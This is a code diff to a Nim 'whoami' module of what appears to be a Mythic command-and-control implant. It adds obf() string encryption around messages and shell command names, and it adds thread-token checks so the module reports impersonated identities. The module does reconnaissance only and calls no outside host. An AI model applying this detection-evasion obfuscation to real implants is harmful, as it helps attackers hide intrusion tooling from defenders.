@@ -1,6 +1,7 @@
-import ../config
-import ../utils/mythic_responses
+import ../utils/m_responses
+import ../utils/debug
 import std/[json, strformat]
+import ../utils/strenc
 
 when defined(windows):
   import winim/lean
@@ -10,9 +11,11 @@ when defined(windows):
     var hToken: HANDLE
     var dwSize: DWORD
     
-    # Open the process token
-    if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, addr hToken) == 0:
-      return "Error: Failed to open process token"
+    # Try to open thread token first (will succeed if impersonating)
+    if OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, 0, addr hToken) == 0:
+      # No thread token, try process token
+      if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, addr hToken) == 0:
+        return obf("Error: Failed to open process token")
     
     # Get the token user information size
     discard GetTokenInformation(hToken, 1, nil, 0, addr dwSize)  # TokenUser = 1
@@ -21,13 +24,13 @@ when defined(windows):
     var pTokenUser = alloc(dwSize)
     if pTokenUser.isNil:
       CloseHandle(hToken)
-      return "Error: Failed to allocate memory"
+      return obf("Error: Failed to allocate memory")
     
     # Get the token user information
     if GetTokenInformation(hToken, 1, pTokenUser, dwSize, addr dwSize) == 0:
       dealloc(pTokenUser)
       CloseHandle(hToken)
-      return "Error: Failed to get token information"
+      return obf("Error: Failed to get token information")
     
     # Extract the SID from TOKEN_USER structure
     let sid = cast[ptr PSID](pTokenUser)[]
@@ -45,7 +48,7 @@ when defined(windows):
       let domainName = $domain
       result = &"{domainName}\\{username}"
     else:
-      result = "Error: Failed to lookup account SID"
+      result = obf("Error: Failed to lookup account SID")
     
     dealloc(pTokenUser)
     CloseHandle(hToken)
@@ -60,33 +63,30 @@ when not defined(windows):
     
     # Get username
     let username = try:
-      let (output, _) = execCmdEx("whoami")
+      let (output, _) = execCmdEx(obf("whoami"))
       output.strip()
     except:
       "unknown"
     
     # Get hostname
     let hostname = try:
-      let (output, _) = execCmdEx("hostname")
+      let (output, _) = execCmdEx(obf("hostname"))
       output.strip()
     except:
       "unknown"
     
     # Check if root
     let isRoot = uid == 0
-    let privs = if isRoot: "root" else: "user"
+    let privs = if isRoot: obf("root") else: obf("user")
     
-    result = &"Username: {username}\nHostname: {hostname}\nUID: {uid}\nGID: {gid}\nPrivileges: {privs}"
+    result = obf("Username: ") & username & obf("\nHostname: ") & hostname & obf("\nUID: ") & $uid & obf("\nGID: ") & $gid & obf("\nPrivileges: ") & privs
 
 proc whoami*(taskId: string, params: string): JsonNode =
-  let cfg = getConfig()
-  
   when defined(windows):
     let output = whoamiWindows()
   else:
     let output = whoamiUnix()
   
-  if cfg.debug:
-    echo "[DEBUG] whoami output: ", output
+  debug "[DEBUG] whoami output: ", output
   
   return mythicSuccess(taskId, output)
